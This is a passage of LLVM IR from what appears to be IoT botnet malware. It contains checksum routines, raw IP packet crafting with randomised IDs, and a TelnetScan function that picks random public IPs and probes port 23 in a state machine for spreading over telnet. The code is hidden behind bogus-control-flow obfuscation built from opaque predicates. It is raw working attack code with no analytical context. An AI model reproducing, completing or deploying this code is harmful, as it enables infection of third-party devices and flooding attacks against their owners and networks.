  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %49, %28
  %30 = load i32, i32* @x.55
  %31 = load i32, i32* @y.56
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = icmp ne i64 %39, 0
  %41 = load i32, i32* @x.55
  %42 = load i32, i32* @y.56
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %40, label %49, label %55

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i64, i64* %5, align 8
  %51 = and i64 %50, 65535
  %52 = load i64, i64* %5, align 8
  %53 = lshr i64 %52, 16
  %54 = add i64 %51, %53
  store i64 %54, i64* %5, align 8
  br label %29

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i64, i64* %5, align 8
  %57 = xor i64 %56, -1
  %58 = trunc i64 %57 to i16
  ret i16 %58

originalBBalteredBB:                              ; preds = %originalBB, %29
  %59 = load i64, i64* %5, align 8
  %_ = shl i64 %59, 16
  %_1 = sub i64 %59, 16
  %gen = mul i64 %_1, 16
  %60 = lshr i64 %59, 16
  %61 = icmp ne i64 %60, 0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.59
  %7 = load i32, i32* @y.60
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %20 = bitcast %struct.iphdr* %19 to i8*
  %21 = load i8, i8* %20, align 4
  %22 = and i8 %21, -16
  %23 = or i8 %22, 5
  store i8 %23, i8* %20, align 4
  %24 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %25 = bitcast %struct.iphdr* %24 to i8*
  %26 = load i8, i8* %25, align 4
  %27 = and i8 %26, 15
  %28 = or i8 %27, 64
  store i8 %28, i8* %25, align 4
  %29 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %30 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %29, i32 0, i32 1
  store i8 0, i8* %30, align 1
  %31 = load i32, i32* %18, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 20, %32
  %34 = trunc i64 %33 to i16
  %35 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 2
  store i16 %34, i16* %36, align 2
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 3
  store i16 %38, i16* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 4
  store i16 0, i16* %42, align 2
  %43 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 5
  store i8 -1, i8* %44, align 4
  %45 = load i8, i8* %17, align 1
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 6
  store i8 %45, i8* %47, align 1
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 7
  store i16 0, i16* %49, align 2
  %50 = load i32, i32* %16, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 8
  store i32 %50, i32* %52, align 4
  %53 = load i32, i32* %15, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 9
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @x.59
  %57 = load i32, i32* @y.60
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %64 = alloca %struct.iphdr*, align 8
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = alloca i8, align 1
  %68 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %64, align 8
  store i32 %1, i32* %65, align 4
  store i32 %2, i32* %66, align 4
  store i8 %3, i8* %67, align 1
  store i32 %4, i32* %68, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %70 = bitcast %struct.iphdr* %69 to i8*
  %71 = load i8, i8* %70, align 4
  %_ = shl i8 %71, -16
  %72 = and i8 %71, -16
  %_1 = sub i8 0, %72
  %gen = add i8 %_1, 5
  %_2 = shl i8 %72, 5
  %_3 = sub i8 %72, 5
  %gen4 = mul i8 %_3, 5
  %73 = or i8 %72, 5
  store i8 %73, i8* %70, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = load i8, i8* %75, align 4
  %_5 = shl i8 %76, 15
  %_6 = shl i8 %76, 15
  %77 = and i8 %76, 15
  %_7 = sub i8 %77, 64
  %gen8 = mul i8 %_7, 64
  %_9 = sub i8 %77, 64
  %gen10 = mul i8 %_9, 64
  %78 = or i8 %77, 64
  store i8 %78, i8* %75, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 1
  store i8 0, i8* %80, align 1
  %81 = load i32, i32* %68, align 4
  %82 = sext i32 %81 to i64
  %_11 = sub i64 0, 20
  %gen12 = add i64 %_11, %82
  %_13 = sub i64 20, %82
  %gen14 = mul i64 %_13, %82
  %_15 = sub i64 20, %82
  %gen16 = mul i64 %_15, %82
  %_17 = sub i64 20, %82
  %gen18 = mul i64 %_17, %82
  %_19 = shl i64 20, %82
  %_20 = shl i64 20, %82
  %_21 = shl i64 20, %82
  %83 = add i64 20, %82
  %84 = trunc i64 %83 to i16
  %85 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 2
  store i16 %84, i16* %86, align 2
  %87 = call i32 @rand_cmwc()
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 -1, i8* %94, align 4
  %95 = load i8, i8* %67, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 6
  store i8 %95, i8* %97, align 1
  %98 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i32 0, i32 7
  store i16 0, i16* %99, align 2
  %100 = load i32, i32* %66, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = load i32, i32* %65, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 9
  store i32 %103, i32* %105, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %26

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* @x.61
  %9 = load i32, i32* @y.62
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* %2, align 4
  %18 = load i32, i32* @x.61
  %19 = load i32, i32* @y.62
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %6
  %27 = load i32, i32* @x.61
  %28 = load i32, i32* @y.62
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i32, i32* %2, align 4
  %36 = load i32, i32* @x.61
  %37 = load i32, i32* @y.62
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %35

originalBBalteredBB:                              ; preds = %originalBB, %7
  %44 = load i32, i32* %3, align 4
  %45 = call i32 @close(i32 %44)
  store i32 0, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %46 = load i32, i32* %2, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScan() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %38

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* @x.63
  %22 = load i32, i32* @y.64
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %20
  %29 = load i32, i32* %1, align 4
  %30 = load i32, i32* @x.63
  %31 = load i32, i32* @y.64
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %originalBBpart2, %19
  %39 = phi i32 [ 512, %19 ], [ %29, %originalBBpart2 ]
  store i32 %39, i32* %1, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %40, align 4
  %41 = call zeroext i16 @htons(i16 zeroext 23) #13
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %1, align 4
  %46 = zext i32 %45 to i64
  %47 = call i8* @llvm.stacksave()
  store i8* %47, i8** %9, align 8
  %48 = alloca %struct.telstate_t, i64 %46, align 16
  %49 = bitcast %struct.telstate_t* %48 to i8*
  %50 = load i32, i32* %1, align 4
  %51 = sext i32 %50 to i64
  %52 = mul i64 %51, 5
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 %52, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %53

; <label>:53:                                     ; preds = %originalBBpart215, %38
  %54 = load i32, i32* %2, align 4
  %55 = load i32, i32* %1, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %91

; <label>:57:                                     ; preds = %53
  %58 = load i32, i32* %2, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = call noalias i8* @malloc(i64 1024) #2
  %63 = load i32, i32* %2, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 8
  store i8* %62, i8** %66, align 8
  %67 = load i32, i32* %2, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %68
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %69, i32 0, i32 8
  %71 = load i8*, i8** %70, align 8
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 1024, i32 1, i1 false)
  br label %72

; <label>:72:                                     ; preds = %57
  %73 = load i32, i32* @x.63
  %74 = load i32, i32* @y.64
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %72
  %81 = load i32, i32* %2, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %2, align 4
  %83 = load i32, i32* @x.63
  %84 = load i32, i32* @y.64
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %53

; <label>:91:                                     ; preds = %53
  %92 = load i32, i32* @x.63
  %93 = load i32, i32* @y.64
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %91
  %100 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 8, i64* %100, align 8
  %101 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %101, align 8
  %102 = load i32, i32* @x.63
  %103 = load i32, i32* @y.64
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %110

; <label>:110:                                    ; preds = %originalBBpart2250, %originalBBpart219
  br label %111

; <label>:111:                                    ; preds = %110
  store i32 0, i32* %2, align 4
  br label %112

; <label>:112:                                    ; preds = %2959, %111
  %113 = load i32, i32* %2, align 4
  %114 = load i32, i32* %1, align 4
  %115 = icmp slt i32 %113, %114
  br i1 %115, label %116, label %2962

; <label>:116:                                    ; preds = %112
  %117 = load i32, i32* @x.63
  %118 = load i32, i32* @y.64
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %116
  %125 = load i32, i32* %2, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 2
  %129 = load i8, i8* %128, align 8
  %130 = zext i8 %129 to i32
  %131 = load i32, i32* @x.63
  %132 = load i32, i32* @y.64
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  switch i32 %130, label %2958 [
    i32 0, label %139
    i32 1, label %362
    i32 2, label %614
    i32 3, label %1031
    i32 4, label %1131
    i32 5, label %1747
    i32 6, label %1815
    i32 7, label %2816
    i32 8, label %2860
  ]

; <label>:139:                                    ; preds = %originalBBpart223
  %140 = load i32, i32* %2, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 8
  %144 = load i8*, i8** %143, align 8
  call void @llvm.memset.p0i8.i64(i8* %144, i8 0, i64 1024, i32 1, i1 false)
  %145 = load i32, i32* %2, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %146
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %147, i32 0, i32 3
  %149 = load i8, i8* %148, align 1
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %171

; <label>:151:                                    ; preds = %139
  %152 = load i32, i32* %2, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 8
  %156 = load i8*, i8** %155, align 8
  store i8* %156, i8** %11, align 8
  %157 = load i32, i32* %2, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %158
  %160 = bitcast %struct.telstate_t* %159 to i8*
  call void @llvm.memset.p0i8.i64(i8* %160, i8 0, i64 32, i32 16, i1 false)
  %161 = load i8*, i8** %11, align 8
  %162 = load i32, i32* %2, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 8
  store i8* %161, i8** %165, align 8
  %166 = call i32 @getRandomPublicIP()
  %167 = load i32, i32* %2, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 1
  store i32 %166, i32* %170, align 4
  br label %258

; <label>:171:                                    ; preds = %139
  %172 = load i32, i32* %2, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 5
  %176 = load i8, i8* %175, align 1
  %177 = add i8 %176, 1
  store i8 %177, i8* %175, align 1
  %178 = load i32, i32* %2, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 5
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i64
  %184 = icmp eq i64 %183, 18
  br i1 %184, label %185, label %212

; <label>:185:                                    ; preds = %171
  %186 = load i32, i32* @x.63
  %187 = load i32, i32* @y.64
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %185
  %194 = load i32, i32* %2, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 5
  store i8 0, i8* %197, align 1
  %198 = load i32, i32* %2, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 4
  %202 = load i8, i8* %201, align 2
  %203 = add i8 %202, 1
  store i8 %203, i8* %201, align 2
  %204 = load i32, i32* @x.63
  %205 = load i32, i32* @y.64
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart229, label %originalBB25alteredBB

originalBBpart229:                                ; preds = %originalBB25
  br label %212

; <label>:212:                                    ; preds = %originalBBpart229, %171
  %213 = load i32, i32* @x.63
  %214 = load i32, i32* @y.64
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %212
  %221 = load i32, i32* %2, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %222
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %223, i32 0, i32 4
  %225 = load i8, i8* %224, align 2
  %226 = zext i8 %225 to i64
  %227 = icmp eq i64 %226, 10
  %228 = load i32, i32* @x.63
  %229 = load i32, i32* @y.64
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %227, label %236, label %257

; <label>:236:                                    ; preds = %originalBBpart233
  %237 = load i32, i32* @x.63
  %238 = load i32, i32* @y.64
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %236
  %245 = load i32, i32* %2, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %246
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %247, i32 0, i32 3
  store i8 1, i8* %248, align 1
  %249 = load i32, i32* @x.63
  %250 = load i32, i32* @y.64
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %2959

